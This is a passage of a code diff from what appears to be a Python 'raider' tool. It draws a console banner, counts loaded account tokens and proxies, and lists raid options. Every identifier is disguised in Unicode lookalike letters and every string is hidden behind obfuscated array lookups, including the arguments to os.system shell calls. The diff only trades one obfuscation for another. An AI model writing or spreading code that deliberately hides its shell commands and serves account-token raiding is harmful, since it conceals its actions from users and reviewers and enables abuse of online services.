+with 𝗼𝗽𝗲𝙣(𝙄𝙉𝘐𝘕𝘭𝘭𝗜𝗠𝙄𝗜𝘭𝙈𝗹𝗹𝗜𝙡𝗹𝘕𝗡𝙄𝙡𝙡𝘔𝙉𝗹𝙉𝙡𝙈𝙄𝗠𝘐𝙈[59], 𝙄𝗡𝙄𝗡𝘭𝘭𝙄𝘔𝗜𝘐𝙡𝙈𝙡𝙡𝗜𝗹𝙡𝙉𝘕𝘐𝗹𝙡𝗠𝙉𝘭𝗡𝗹𝙈𝗜𝘔𝗜𝘔[30]) as 𝗳:
+    𝘁𝙤𝘬𝙚𝗻𝘀 = 𝙛.read().splitlines()
 
 def wrapper(func):
 
     def wrapper(*args, **kwargs):
-        𝙘𝗼𝗻𝘀𝗼𝘭𝘦.render_ascii()
-        𝙧𝗲𝙨𝘂𝙡𝘁 = 𝙛𝘂𝗻𝗰(*𝗮𝙧𝙜𝘴, **𝙠𝘄𝙖𝙧𝗴𝘴)
-        return 𝘳𝗲𝙨𝘂𝘭𝘵
-    return 𝘄𝗿𝘢𝘱𝗽𝗲𝘳
+        𝙘𝙤𝘯𝘀𝗼𝘭𝗲.render_ascii()
+        𝙧𝗲𝙨𝙪𝘭𝘁 = 𝘧𝘶𝙣𝘤(*𝘢𝘳𝘨𝘴, **𝙠𝙬𝘢𝗿𝘨𝙨)
+        return 𝙧𝗲𝙨𝙪𝗹𝙩
+    return 𝘄𝙧𝘢𝙥𝗽𝗲𝘳
 
 class Render:
 
     def __init__(self):
-        𝘴𝘦𝘵𝗮𝘵𝙩𝙧(𝙨𝘦𝗹𝘧, 'size', 𝗼𝙨.get_terminal_size().columns)
+        𝘴𝙚𝙩𝗮𝙩𝙩𝗿(𝘀𝙚𝙡𝘧, 'size', 𝘰𝘀.get_terminal_size().columns)
 
     def render_ascii(self):
-        𝙤𝙨.system(𝙉𝙈𝙈𝘔𝘕𝗹𝙡𝗠𝙈𝘭𝙈𝙈𝘕𝙡𝗜𝙈𝘐𝗜𝘕𝙈𝘐𝙄𝘔𝙄𝘭𝘐𝙉𝘐𝙈𝘐𝙄𝘔[1])
-        with 𝗼𝙥𝗲𝙣(𝗡𝗠𝗠𝘔𝘕𝙡𝙡𝙈𝗠𝙡𝙈𝘔𝘕𝙡𝗜𝗠𝘐𝙄𝘕𝗠𝙄𝗜𝗠𝗜𝘭𝙄𝙉𝘐𝙈𝙄𝙄𝘔[66], 𝗡𝗠𝗠𝙈𝘕𝙡𝘭𝘔𝘔𝗹𝘔𝗠𝙉𝗹𝙄𝘔𝙄𝘐𝙉𝘔𝙄𝘐𝘔𝗜𝘭𝘐𝗡𝙄𝙈𝗜𝙄𝘔[37]) as 𝗳:
-            𝘁𝘰𝗸𝘦𝙣𝘀 = 𝘧.read().splitlines()
-        𝘦𝗱𝗴𝗲𝘀 = [𝗡𝙈𝘔𝙈𝙉𝗹𝗹𝗠𝙈𝗹𝗠𝗠𝙉𝗹𝘐𝗠𝙄𝙄𝗡𝗠𝗜𝘐𝘔𝙄𝗹𝘐𝗡𝘐𝙈𝗜𝘐𝙈[42], 𝘕𝙈𝙈𝙈𝗡𝗹𝗹𝘔𝘔𝗹𝙈𝘔𝙉𝗹𝗜𝗠𝙄𝘐𝘕𝘔𝘐𝘐𝗠𝘐𝘭𝗜𝘕𝙄𝘔𝙄𝘐𝙈[49], 𝙉𝘔𝘔𝙈𝗡𝘭𝘭𝗠𝘔𝘭𝙈𝘔𝗡𝘭𝘐𝗠𝙄𝙄𝗡𝘔𝘐𝙄𝘔𝙄𝘭𝗜𝘕𝙄𝗠𝙄𝘐𝙈[67], 𝙉𝙈𝗠𝘔𝘕𝗹𝘭𝙈𝙈𝘭𝘔𝗠𝙉𝘭𝘐𝘔𝙄𝘐𝗡𝗠𝘐𝗜𝗠𝙄𝘭𝘐𝙉𝘐𝙈𝙄𝗜𝙈[68], 𝙉𝗠𝗠𝘔𝙉𝘭𝗹𝗠𝘔𝙡𝗠𝘔𝗡𝗹𝘐𝘔𝙄𝘐𝗡𝗠𝗜𝘐𝙈𝙄𝙡𝗜𝙉𝘐𝗠𝗜𝙄𝘔[69], 𝘕𝘔𝗠𝗠𝘕𝘭𝙡𝗠𝘔𝙡𝘔𝘔𝙉𝘭𝗜𝗠𝙄𝗜𝙉𝙈𝘐𝙄𝘔𝘐𝘭𝗜𝙉𝗜𝘔𝙄𝘐𝙈[57]]
-        𝘁𝙞𝘵𝙡𝙚 = f"{𝘕𝘔𝗠𝙈𝘕𝘭𝘭𝘔𝘔𝙡𝗠𝙈𝙉𝙡𝘐𝗠𝘐𝙄𝙉𝗠𝙄𝘐𝙈𝙄𝙡𝘐𝙉𝘐𝗠𝙄𝘐𝘔[70]}{𝙉𝗠𝗠𝗠𝘕𝘭𝙡𝘔𝗠𝘭𝘔𝗠𝗡𝘭𝘐𝙈𝘐𝘐𝘕𝘔𝙄𝗜𝘔𝙄𝗹𝗜𝗡𝘐𝙈𝘐𝗜𝗠[71].center(𝘴𝘦𝘭𝗳.size)}{𝘕𝙈𝗠𝗠𝘕𝗹𝙡𝘔𝘔𝙡𝙈𝙈𝘕𝗹𝘐𝙈𝙄𝗜𝘕𝗠𝙄𝘐𝙈𝗜𝙡𝘐𝙉𝘐𝙈𝙄𝗜𝙈[70]}{𝙉𝙈𝙈𝘔𝗡𝙡𝙡𝙈𝘔𝗹𝗠𝗠𝘕𝘭𝙄𝘔𝘐𝘐𝘕𝗠𝗜𝙄𝗠𝙄𝗹𝘐𝗡𝗜𝘔𝙄𝘐𝘔[72].center(𝘀𝘦𝘭𝙛.size)}{𝗡𝗠𝙈𝗠𝗡𝗹𝗹𝘔𝗠𝗹𝙈𝙈𝙉𝘭𝙄𝘔𝗜𝗜𝙉𝙈𝗜𝘐𝙈𝘐𝘭𝘐𝙉𝘐𝘔𝗜𝗜𝘔[70]}{𝗡𝙈𝙈𝗠𝙉𝘭𝙡𝙈𝙈𝘭𝗠𝗠𝘕𝘭𝗜𝗠𝗜𝘐𝗡𝗠𝗜𝙄𝘔𝘐𝗹𝗜𝙉𝗜𝗠𝗜𝗜𝙈[73].center(𝙨𝗲𝘭𝗳.size)}{𝙉𝗠𝗠𝗠𝙉𝗹𝗹𝙈𝘔𝙡𝘔𝗠𝗡𝘭𝙄𝙈𝙄𝙄𝙉𝗠𝗜𝙄𝙈𝘐𝗹𝙄𝘕𝗜𝗠𝗜𝙄𝗠[70]}{𝘕𝗠𝘔𝘔𝗡𝗹𝗹𝗠𝗠𝗹𝘔𝙈𝗡𝘭𝘐𝗠𝗜𝗜𝙉𝘔𝘐𝘐𝗠𝘐𝗹𝘐𝗡𝗜𝙈𝗜𝗜𝙈[74].center(𝘴𝘦𝘭𝗳.size)}{𝘕𝗠𝘔𝘔𝙉𝘭𝗹𝘔𝗠𝗹𝗠𝘔𝗡𝗹𝗜𝙈𝙄𝗜𝘕𝙈𝘐𝘐𝘔𝗜𝘭𝙄𝙉𝙄𝗠𝙄𝗜𝗠[70]}{𝗡𝗠𝙈𝘔𝘕𝗹𝗹𝗠𝗠𝙡𝘔𝗠𝗡𝙡𝘐𝗠𝗜𝗜𝗡𝗠𝗜𝘐𝘔𝙄𝘭𝗜𝙉𝙄𝙈𝘐𝗜𝙈[75].center(𝘴𝘦𝘭𝙛.size)}{𝙉𝙈𝘔𝗠𝙉𝙡𝙡𝙈𝘔𝙡𝗠𝗠𝗡𝗹𝘐𝗠𝘐𝙄𝙉𝗠𝗜𝗜𝘔𝙄𝘭𝙄𝗡𝘐𝙈𝘐𝘐𝗠[70]}{𝙉𝗠𝘔𝙈𝗡𝗹𝙡𝗠𝙈𝘭𝘔𝙈𝘕𝗹𝘐𝘔𝗜𝙄𝘕𝙈𝗜𝗜𝘔𝗜𝙡𝙄𝗡𝗜𝗠𝗜𝘐𝘔[76].center(𝙨𝙚𝗹𝙛.size)}{𝗡𝘔𝙈𝗠𝗡𝘭𝙡𝗠𝙈𝙡𝘔𝗠𝗡𝘭𝗜𝗠𝘐𝘐𝙉𝘔𝙄𝗜𝗠𝗜𝗹𝙄𝗡𝗜𝗠𝙄𝗜𝙈[77]}{f'{𝘕𝘔𝗠𝙈𝗡𝗹𝙡𝗠𝘔𝗹𝗠𝗠𝙉𝙡𝗜𝗠𝘐𝘐𝗡𝙈𝗜𝘐𝘔𝗜𝙡𝙄𝗡𝙄𝘔𝙄𝗜𝙈[78]}{𝗿}{𝗡𝘔𝗠𝗠𝙉𝘭𝙡𝘔𝗠𝘭𝙈𝗠𝗡𝗹𝘐𝘔𝙄𝗜𝘕𝘔𝙄𝙄𝙈𝘐𝘭𝘐𝘕𝙄𝘔𝙄𝘐𝘔[79]}{𝗹𝙘}{𝙡𝘦𝙣(𝘵𝘰𝙠𝙚𝙣𝙨)}{𝘳}{𝘕𝗠𝘔𝙈𝗡𝙡𝙡𝗠𝙈𝘭𝗠𝙈𝘕𝘭𝙄𝘔𝙄𝗜𝙉𝙈𝘐𝙄𝙈𝗜𝙡𝙄𝗡𝘐𝗠𝗜𝘐𝙈[80]}{𝙡𝙘}{𝗹𝗲𝙣(𝘱𝘳𝙤𝘹𝘪𝗲𝙨)}{𝙧}{𝘕𝗠𝙈𝗠𝙉𝘭𝙡𝘔𝘔𝘭𝗠𝗠𝙉𝗹𝘐𝗠𝙄𝘐𝗡𝙈𝙄𝙄𝘔𝙄𝘭𝗜𝙉𝗜𝗠𝘐𝙄𝗠[81]}'.center(𝙨𝙚𝗹𝘧.size)}{𝙉𝙈𝘔𝗠𝙉𝙡𝗹𝗠𝗠𝗹𝘔𝘔𝘕𝘭𝙄𝗠𝗜𝘐𝘕𝘔𝙄𝘐𝗠𝗜𝗹𝗜𝘕𝗜𝙈𝘐𝗜𝙈[70]}"
-        for 𝗲𝙙𝙜𝙚 in 𝗲𝗱𝘨𝘦𝘀:
-            𝙩𝙞𝘵𝙡𝗲 = 𝙩𝙞𝙩𝗹𝙚.replace(𝘦𝘥𝙜𝙚, f'{𝗙𝘰𝗿𝘦.LIGHTCYAN_EX}{𝘦𝙙𝘨𝗲}{𝗙𝗼𝘳𝗲.RESET}')
-        𝘱𝙧𝙞𝙣𝘁(𝙩𝗶𝘁𝗹𝘦)
+        𝗼𝘀.system(𝘐𝘕𝗜𝘕𝙡𝗹𝙄𝙈𝗜𝗜𝘭𝗠𝗹𝘭𝘐𝗹𝙡𝘕𝘕𝘐𝙡𝗹𝗠𝗡𝘭𝙉𝘭𝘔𝘐𝘔𝗜𝘔[1])
+        with 𝙤𝗽𝙚𝘯(𝘐𝗡𝘐𝙉𝘭𝗹𝘐𝙈𝙄𝘐𝗹𝗠𝘭𝗹𝗜𝘭𝙡𝙉𝘕𝗜𝙡𝘭𝘔𝗡𝗹𝘕𝗹𝘔𝗜𝗠𝘐𝙈[59], 𝙄𝗡𝘐𝘕𝘭𝗹𝘐𝗠𝗜𝗜𝙡𝗠𝙡𝘭𝗜𝗹𝘭𝗡𝗡𝘐𝗹𝘭𝘔𝘕𝙡𝗡𝗹𝘔𝙄𝙈𝘐𝙈[30]) as 𝙛:
+            𝘵𝙤𝘬𝗲𝗻𝘴 = 𝙛.read().splitlines()
+        𝘦𝙙𝘨𝗲𝘀 = [𝗜𝗡𝗜𝘕𝗹𝘭𝗜𝘔𝘐𝘐𝙡𝙈𝘭𝘭𝙄𝙡𝗹𝙉𝙉𝘐𝙡𝙡𝙈𝗡𝗹𝙉𝗹𝙈𝙄𝗠𝗜𝘔[35], 𝘐𝙉𝘐𝙉𝗹𝘭𝙄𝘔𝗜𝗜𝙡𝙈𝗹𝗹𝗜𝙡𝙡𝙉𝘕𝘐𝙡𝙡𝗠𝗡𝗹𝙉𝗹𝙈𝘐𝘔𝘐𝙈[42], 𝙄𝗡𝙄𝘕𝙡𝗹𝙄𝙈𝗜𝙄𝙡𝙈𝙡𝘭𝙄𝘭𝗹𝘕𝙉𝗜𝙡𝗹𝙈𝗡𝗹𝘕𝘭𝘔𝗜𝗠𝘐𝗠[60], 𝙄𝘕𝘐𝘕𝘭𝙡𝗜𝗠𝘐𝙄𝘭𝘔𝗹𝘭𝘐𝘭𝗹𝙉𝗡𝘐𝙡𝘭𝘔𝗡𝘭𝙉𝗹𝙈𝗜𝙈𝙄𝘔[61], 𝗜𝙉𝘐𝘕𝙡𝗹𝘐𝙈𝘐𝘐𝙡𝗠𝙡𝘭𝘐𝙡𝗹𝙉𝙉𝘐𝙡𝙡𝘔𝗡𝘭𝘕𝘭𝘔𝗜𝘔𝘐𝗠[62], 𝙄𝗡𝗜𝘕𝙡𝗹𝙄𝙈𝘐𝘐𝗹𝗠𝗹𝙡𝙄𝘭𝗹𝙉𝘕𝗜𝘭𝙡𝗠𝗡𝗹𝘕𝙡𝙈𝗜𝙈𝗜𝗠[50]]
+        𝘁𝗶𝘁𝗹𝙚 = f"{𝘐𝙉𝗜𝘕𝘭𝙡𝘐𝘔𝘐𝗜𝗹𝗠𝙡𝙡𝘐𝘭𝘭𝘕𝙉𝙄𝘭𝙡𝙈𝙉𝗹𝘕𝘭𝗠𝙄𝙈𝘐𝘔[63]}{𝗜𝘕𝘐𝗡𝙡𝙡𝗜𝘔𝗜𝙄𝘭𝙈𝙡𝗹𝘐𝘭𝗹𝘕𝙉𝘐𝘭𝗹𝙈𝘕𝗹𝗡𝙡𝙈𝘐𝗠𝙄𝙈[64].center(𝘴𝘦𝗹𝘧.size)}{𝙄𝗡𝘐𝙉𝗹𝘭𝗜𝘔𝙄𝘐𝘭𝗠𝙡𝘭𝗜𝗹𝘭𝙉𝗡𝙄𝙡𝘭𝙈𝘕𝙡𝙉𝘭𝘔𝙄𝘔𝗜𝘔[63]}{𝘐𝘕𝘐𝘕𝘭𝗹𝙄𝗠𝙄𝗜𝗹𝗠𝘭𝘭𝙄𝗹𝗹𝙉𝗡𝘐𝘭𝘭𝘔𝙉𝗹𝗡𝗹𝙈𝘐𝘔𝙄𝙈[65].center(𝘀𝗲𝗹𝘧.size)}{𝘐𝙉𝗜𝘕𝙡𝙡𝘐𝙈𝘐𝘐𝘭𝗠𝘭𝘭𝙄𝙡𝗹𝙉𝘕𝘐𝘭𝙡𝘔𝗡𝗹𝙉𝘭𝙈𝗜𝙈𝗜𝗠[63]}{𝙄𝘕𝙄𝘕𝙡𝘭𝘐𝗠𝘐𝙄𝘭𝘔𝗹𝙡𝘐𝙡𝙡𝘕𝙉𝗜𝗹𝗹𝗠𝘕𝙡𝘕𝙡𝙈𝘐𝗠𝙄𝙈[66].center(𝘀𝗲𝗹𝙛.size)}{𝗜𝙉𝗜𝙉𝗹𝗹𝘐𝙈𝙄𝘐𝗹𝙈𝘭𝗹𝘐𝗹𝙡𝗡𝗡𝘐𝘭𝘭𝗠𝘕𝙡𝘕𝙡𝗠𝗜𝙈𝘐𝙈[63]}{𝘐𝘕𝗜𝙉𝙡𝗹𝗜𝗠𝙄𝘐𝘭𝙈𝙡𝗹𝗜𝙡𝗹𝗡𝗡𝘐𝗹𝙡𝘔𝗡𝗹𝙉𝗹𝙈𝗜𝘔𝘐𝘔[67].center(𝙨𝗲𝙡𝗳.size)}{𝙄𝙉𝘐𝗡𝙡𝙡𝙄𝘔𝘐𝘐𝗹𝗠𝙡𝙡𝘐𝗹𝘭𝗡𝘕𝘐𝗹𝘭𝙈𝙉𝙡𝘕𝗹𝗠𝙄𝗠𝙄𝘔[63]}{𝘐𝙉𝘐𝘕𝗹𝘭𝙄𝗠𝗜𝙄𝙡𝙈𝘭𝙡𝘐𝘭𝘭𝗡𝙉𝙄𝗹𝗹𝘔𝗡𝘭𝘕𝘭𝙈𝘐𝙈𝙄𝘔[68].center(𝙨𝘦𝙡𝙛.size)}{𝘐𝗡𝙄𝙉𝘭𝘭𝙄𝘔𝘐𝘐𝘭𝘔𝘭𝗹𝘐𝙡𝗹𝗡𝙉𝗜𝙡𝙡𝙈𝗡𝘭𝘕𝙡𝙈𝙄𝙈𝘐𝙈[63]}{𝙄𝘕𝗜𝗡𝙡𝗹𝗜𝗠𝗜𝗜𝗹𝗠𝗹𝗹𝗜𝗹𝗹𝙉𝘕𝙄𝘭𝗹𝙈𝘕𝘭𝘕𝙡𝗠𝘐𝗠𝙄𝘔[69].center(𝘴𝙚𝘭𝗳.size)}{𝙄𝙉𝘐𝙉𝗹𝘭𝗜𝙈𝘐𝗜𝙡𝘔𝗹𝗹𝗜𝗹𝘭𝘕𝙉𝘐𝙡𝙡𝗠𝗡𝙡𝙉𝙡𝗠𝙄𝙈𝘐𝙈[70]}{f'{𝙄𝙉𝗜𝘕𝘭𝙡𝙄𝘔𝗜𝗜𝗹𝙈𝙡𝗹𝘐𝙡𝗹𝗡𝙉𝙄𝘭𝘭𝙈𝙉𝗹𝘕𝘭𝘔𝙄𝘔𝙄𝗠[71]}{𝘳}{𝙄𝘕𝘐𝙉𝘭𝙡𝙄𝘔𝘐𝙄𝗹𝘔𝗹𝗹𝘐𝗹𝗹𝘕𝘕𝘐𝙡𝘭𝙈𝙉𝘭𝙉𝗹𝙈𝙄𝘔𝗜𝘔[72]}{𝗹𝙘}{𝙡𝘦𝙣(𝙩𝗼𝙠𝙚𝗻𝘴)}{𝙧}{𝘐𝙉𝗜𝘕𝘭𝗹𝘐𝙈𝙄𝙄𝙡𝙈𝙡𝗹𝘐𝗹𝗹𝗡𝗡𝗜𝘭𝘭𝘔𝙉𝘭𝙉𝘭𝙈𝘐𝘔𝙄𝙈[73]}{𝙡𝙘}{𝘭𝙚𝙣(𝗽𝗿𝘰𝘅𝗶𝘦𝙨)}{𝙧}{𝗜𝙉𝙄𝗡𝙡𝗹𝗜𝘔𝙄𝘐𝗹𝙈𝗹𝗹𝗜𝗹𝗹𝙉𝘕𝗜𝗹𝘭𝗠𝘕𝙡𝙉𝙡𝙈𝗜𝙈𝗜𝗠[74]}'.center(𝙨𝗲𝘭𝘧.size)}{𝗜𝗡𝙄𝗡𝙡𝗹𝙄𝘔𝗜𝘐𝘭𝙈𝘭𝘭𝗜𝗹𝙡𝙉𝗡𝘐𝘭𝗹𝘔𝙉𝘭𝘕𝘭𝗠𝗜𝘔𝗜𝘔[63]}"
+        for 𝙚𝘥𝗴𝗲 in 𝘦𝗱𝘨𝘦𝘴:
+            𝘁𝗶𝘁𝗹𝘦 = 𝙩𝗶𝙩𝘭𝙚.replace(𝙚𝗱𝗴𝘦, f'{𝙁𝙤𝘳𝘦.LIGHTCYAN_EX}{𝗲𝙙𝙜𝘦}{𝗙𝙤𝗿𝙚.RESET}')
+        𝙥𝘳𝘪𝘯𝙩(𝘁𝙞𝘵𝘭𝙚)
 
     def raider_options(self):
-        𝘦𝙙𝙜𝘦𝙨 = [𝗡𝗠𝗠𝙈𝗡𝗹𝘭𝘔𝗠𝘭𝗠𝘔𝘕𝗹𝗜𝙈𝗜𝙄𝙉𝗠𝗜𝙄𝗠𝘐𝙡𝘐𝙉𝙄𝘔𝘐𝗜𝗠[82], 𝙉𝗠𝘔𝗠𝘕𝘭𝙡𝘔𝘔𝘭𝗠𝗠𝗡𝘭𝘐𝙈𝗜𝗜𝘕𝗠𝗜𝙄𝙈𝘐𝙡𝘐𝘕𝙄𝗠𝙄𝙄𝙈[83], 𝙉𝙈𝗠𝙈𝗡𝙡𝗹𝘔𝗠𝗹𝘔𝘔𝙉𝗹𝘐𝘔𝘐𝙄𝗡𝗠𝙄𝘐𝗠𝘐𝙡𝙄𝙉𝘐𝘔𝙄𝘐𝘔[84], 𝙉𝙈𝘔𝗠𝘕𝙡𝙡𝗠𝘔𝘭𝗠𝙈𝘕𝗹𝘐𝗠𝗜𝙄𝗡𝙈𝗜𝘐𝗠𝗜𝘭𝗜𝙉𝙄𝗠𝙄𝘐𝙈[85], 𝘕𝗠𝙈𝙈𝗡𝗹𝗹𝙈𝘔𝘭𝗠𝗠𝘕𝘭𝗜𝙈𝙄𝘐𝙉𝙈𝘐𝙄𝗠𝙄𝗹𝗜𝗡𝙄𝗠𝘐𝘐𝘔[86], 𝙉𝘔𝙈𝗠𝘕𝙡𝘭𝗠𝗠𝙡𝗠𝙈𝘕𝗹𝗜𝙈𝗜𝘐𝗡𝘔𝙄𝘐𝗠𝗜𝙡𝗜𝙉𝘐𝙈𝙄𝗜𝘔[87], 𝘕𝘔𝘔𝙈𝙉𝙡𝙡𝙈𝙈𝘭𝙈𝘔𝘕𝘭𝗜𝘔𝙄𝗜𝗡𝗠𝘐𝘐𝘔𝗜𝗹𝘐𝙉𝙄𝗠𝗜𝘐𝘔[88], 𝗡𝙈𝙈𝗠𝗡𝘭𝘭𝙈𝗠𝘭𝘔𝘔𝘕𝘭𝙄𝙈𝙄𝗜𝗡𝘔𝗜𝙄𝗠𝗜𝙡𝙄𝘕𝗜𝙈𝙄𝗜𝙈[89]]
-        𝘁𝘪𝘁𝙡𝘦 = f'{𝗡𝙈𝙈𝘔𝙉𝗹𝗹𝙈𝘔𝘭𝙈𝗠𝗡𝘭𝘐𝘔𝗜𝘐𝘕𝙈𝘐𝙄𝗠𝙄𝗹𝗜𝘕𝗜𝙈𝘐𝗜𝙈[90].center(𝘴𝗲𝗹𝙛.size)}{𝙉𝗠𝗠𝘔𝙉𝘭𝙡𝙈𝙈𝙡𝘔𝙈𝗡𝘭𝘐𝗠𝙄𝗜𝗡𝙈𝙄𝙄𝙈𝘐𝘭𝗜𝙉𝘐𝙈𝙄𝘐𝙈[70]}{𝘕𝘔𝙈𝗠𝗡𝘭𝘭𝗠𝗠𝘭𝘔𝗠𝘕𝗹𝗜𝘔𝙄𝗜𝙉𝗠𝘐𝙄𝙈𝙄𝘭𝙄𝘕𝘐𝙈𝘐𝘐𝙈[91].center(𝙨𝙚𝘭𝘧.size)}{𝗡𝘔𝗠𝙈𝗡𝘭𝙡𝘔𝗠𝘭𝙈𝙈𝗡𝗹𝘐𝙈𝗜𝘐𝙉𝘔𝘐𝗜𝙈𝙄𝙡𝗜𝙉𝘐𝙈𝗜𝙄𝗠[70]}{𝙉𝘔𝗠𝘔𝙉𝙡𝙡𝙈𝘔𝙡𝘔𝙈𝘕𝘭𝘐𝘔𝙄𝘐𝙉𝙈𝗜𝙄𝘔𝗜𝗹𝗜𝘕𝘐𝙈𝙄𝘐𝙈[92].center(𝘀𝗲𝗹𝘧.size)}{𝗡𝘔𝗠𝘔𝗡𝗹𝙡𝗠𝘔𝙡𝙈𝗠𝙉𝙡𝗜𝘔𝘐𝙄𝙉𝙈𝙄𝙄𝗠𝙄𝘭𝙄𝘕𝙄𝙈𝘐𝘐𝙈[70]}{𝙉𝙈𝗠𝘔𝘕𝗹𝙡𝙈𝘔𝗹𝙈𝗠𝘕𝙡𝘐𝙈𝙄𝘐𝙉𝗠𝙄𝗜𝙈𝙄𝗹𝗜𝘕𝘐𝙈𝙄𝘐𝘔[93].center(𝘴𝙚𝙡𝘧.size)}{𝘕𝘔𝗠𝗠𝙉𝙡𝗹𝗠𝗠𝙡𝗠𝘔𝘕𝗹𝙄𝘔𝙄𝗜𝙉𝘔𝙄𝙄𝙈𝘐𝗹𝗜𝗡𝙄𝗠𝘐𝗜𝘔[70]}{𝗡𝘔𝙈𝗠𝗡𝗹𝘭𝙈𝘔𝗹𝘔𝘔𝗡𝗹𝘐𝘔𝘐𝙄𝘕𝘔𝙄𝘐𝙈𝗜𝙡𝙄𝙉𝙄𝙈𝙄𝙄𝙈[94].center(𝘴𝗲𝘭𝘧.size)}{𝗡𝗠𝗠𝗠𝘕𝗹𝗹𝙈𝙈𝙡𝗠𝘔𝘕𝗹𝙄𝘔𝗜𝘐𝗡𝘔𝙄𝗜𝗠𝘐𝙡𝗜𝗡𝗜𝘔𝘐𝘐𝙈[70]}{𝘕𝗠𝙈𝗠𝘕𝙡𝗹𝘔𝘔𝘭𝘔𝘔𝘕𝘭𝗜𝘔𝙄𝘐𝘕𝗠𝘐𝙄𝙈𝘐𝗹𝙄𝗡𝘐𝘔𝗜𝘐𝗠[95].center(𝙨𝙚𝘭𝙛.size)}{𝙉𝙈𝗠𝘔𝙉𝗹𝙡𝗠𝘔𝙡𝙈𝙈𝙉𝙡𝙄𝘔𝗜𝙄𝗡𝙈𝙄𝘐𝗠𝙄𝘭𝘐𝙉𝘐𝙈𝗜𝙄𝘔[70]}{𝗡𝗠𝘔𝘔𝗡𝗹𝗹𝙈𝘔𝗹𝗠𝙈𝙉𝗹𝗜𝙈𝘐𝗜𝙉𝘔𝗜𝘐𝙈𝙄𝗹𝗜𝗡𝗜𝗠𝗜𝙄𝘔[96].center(𝘀𝙚𝘭𝙛.size)}{𝗡𝙈𝙈𝗠𝙉𝘭𝙡𝘔𝙈𝗹𝗠𝙈𝙉𝘭𝙄𝙈𝗜𝗜𝙉𝘔𝗜𝘐𝘔𝗜𝗹𝘐𝘕𝙄𝗠𝙄𝗜𝗠[70]}'
-        for 𝙚𝘥𝙜𝙚 in 𝗲𝗱𝗴𝗲𝘴:
-            𝘵𝗶𝘵𝗹𝗲 = 𝙩𝙞𝙩𝗹𝗲.replace(𝘦𝘥𝘨𝘦, f'{𝘍𝗼𝙧𝘦.LIGHTCYAN_EX}{𝘦𝘥𝘨𝙚}{𝙁𝗼𝙧𝘦.RESET}')
-        𝗽𝗿𝗶𝘯𝘁(𝘵𝗶𝙩𝗹𝘦)
-        𝗼𝘴.system(𝗡𝗠𝗠𝗠𝙉𝙡𝘭𝗠𝙈𝙡𝘔𝘔𝗡𝙡𝗜𝙈𝙄𝘐𝙉𝘔𝘐𝘐𝘔𝙄𝙡𝗜𝘕𝘐𝗠𝗜𝙄𝗠[97])
+        𝙚𝗱𝗴𝙚𝘀 = [𝘐𝗡𝙄𝘕𝙡𝙡𝗜𝙈𝘐𝗜𝙡𝘔𝙡𝗹𝗜𝗹𝙡𝙉𝘕𝙄𝗹𝗹𝘔𝙉𝗹𝙉𝙡𝙈𝘐𝘔𝘐𝘔[75], 𝙄𝘕𝘐𝘕𝘭𝗹𝙄𝙈𝙄𝘐𝙡𝘔𝙡𝗹𝗜𝗹𝙡𝗡𝗡𝙄𝙡𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝘐𝘔𝘐𝙈[76], 𝘐𝗡𝗜𝘕𝙡𝗹𝘐𝘔𝗜𝙄𝘭𝘔𝗹𝙡𝗜𝘭𝘭𝘕𝘕𝘐𝘭𝘭𝗠𝗡𝗹𝙉𝗹𝗠𝘐𝘔𝙄𝗠[77], 𝙄𝗡𝗜𝘕𝗹𝙡𝗜𝙈𝘐𝗜𝘭𝙈𝘭𝘭𝘐𝗹𝙡𝗡𝗡𝘐𝗹𝙡𝘔𝗡𝗹𝗡𝗹𝘔𝘐𝙈𝗜𝗠[78], 𝙄𝙉𝘐𝗡𝗹𝘭𝙄𝘔𝗜𝘐𝙡𝘔𝗹𝘭𝗜𝗹𝘭𝘕𝘕𝘐𝘭𝗹𝘔𝙉𝙡𝙉𝘭𝗠𝙄𝗠𝗜𝗠[79], 𝙄𝗡𝗜𝙉𝗹𝗹𝙄𝗠𝘐𝘐𝗹𝙈𝗹𝙡𝘐𝘭𝘭𝙉𝗡𝘐𝙡𝗹𝙈𝙉𝘭𝘕𝙡𝘔𝗜𝘔𝙄𝙈[80], 𝘐𝙉𝙄𝗡𝘭𝗹𝙄𝘔𝘐𝗜𝗹𝙈𝗹𝘭𝘐𝗹𝙡𝘕𝗡𝙄𝙡𝗹𝘔𝙉𝗹𝗡𝙡𝙈𝘐𝘔𝙄𝘔[81], 𝙄𝙉𝙄𝗡𝗹𝙡𝘐𝗠𝘐𝗜𝙡𝘔𝙡𝘭𝗜𝙡𝙡𝗡𝙉𝙄𝙡𝙡𝙈𝗡𝙡𝘕𝘭𝗠𝘐𝙈𝘐𝙈[82]]
+        𝘵𝘪𝘁𝗹𝗲 = f'{𝘐𝘕𝙄𝘕𝙡𝗹𝘐𝘔𝘐𝘐𝗹𝗠𝙡𝗹𝘐𝘭𝙡𝗡𝘕𝙄𝙡𝗹𝗠𝙉𝘭𝙉𝘭𝙈𝗜𝗠𝘐𝘔[83].center(𝘀𝙚𝘭𝗳.size)}{𝙄𝙉𝘐𝙉𝘭𝗹𝗜𝙈𝘐𝙄𝘭𝙈𝘭𝙡𝗜𝘭𝙡𝙉𝗡𝘐𝙡𝗹𝗠𝙉𝙡𝙉𝗹𝗠𝗜𝗠𝙄𝗠[63]}{𝘐𝘕𝗜𝗡𝙡𝙡𝙄𝙈𝘐𝘐𝘭𝘔𝘭𝙡𝘐𝘭𝗹𝘕𝙉𝙄𝙡𝙡𝗠𝗡𝙡𝗡𝗹𝗠𝘐𝘔𝘐𝗠[84].center(𝘴𝗲𝘭𝗳.size)}{𝗜𝗡𝙄𝗡𝙡𝙡𝗜𝙈𝙄𝙄𝗹𝗠𝙡𝗹𝙄𝗹𝗹𝗡𝙉𝙄𝙡𝘭𝙈𝘕𝘭𝙉𝘭𝘔𝗜𝗠𝘐𝗠[63]}{𝗜𝗡𝙄𝙉𝗹𝙡𝘐𝙈𝗜𝘐𝙡𝘔𝙡𝗹𝙄𝘭𝘭𝙉𝗡𝗜𝗹𝙡𝙈𝘕𝙡𝙉𝙡𝘔𝘐𝗠𝗜𝙈[85].center(𝘀𝗲𝘭𝙛.size)}{𝗜𝗡𝗜𝙉𝗹𝙡𝙄𝗠𝙄𝙄𝗹𝙈𝘭𝘭𝗜𝘭𝘭𝙉𝗡𝗜𝗹𝗹𝗠𝘕𝗹𝙉𝙡𝙈𝘐𝗠𝘐𝘔[63]}{𝘐𝘕𝘐𝘕𝗹𝙡𝙄𝗠𝘐𝗜𝗹𝗠𝘭𝗹𝘐𝙡𝙡𝙉𝘕𝙄𝘭𝗹𝘔𝘕𝙡𝗡𝘭𝗠𝘐𝗠𝘐𝘔[86].center(𝙨𝗲